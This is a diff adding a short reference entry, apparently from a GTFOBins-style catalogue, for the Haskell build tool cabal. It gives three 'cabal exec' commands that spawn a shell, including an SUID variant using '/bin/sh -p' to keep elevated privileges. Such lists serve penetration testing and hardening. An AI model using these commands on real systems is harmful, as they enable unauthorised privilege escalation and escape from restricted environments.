@@ -1,0 +1,14 @@
+cabal
+=====
+
+Shell
+-----
+
+[Sudo]
+    cabal exec --project-file=/dev/null -- /bin/sh
+
+[SUID]
+    cabal exec --project-file=/dev/null -- /bin/sh -p
+
+[Unprivileged]
+    cabal exec --project-file=/dev/null -- /bin/sh
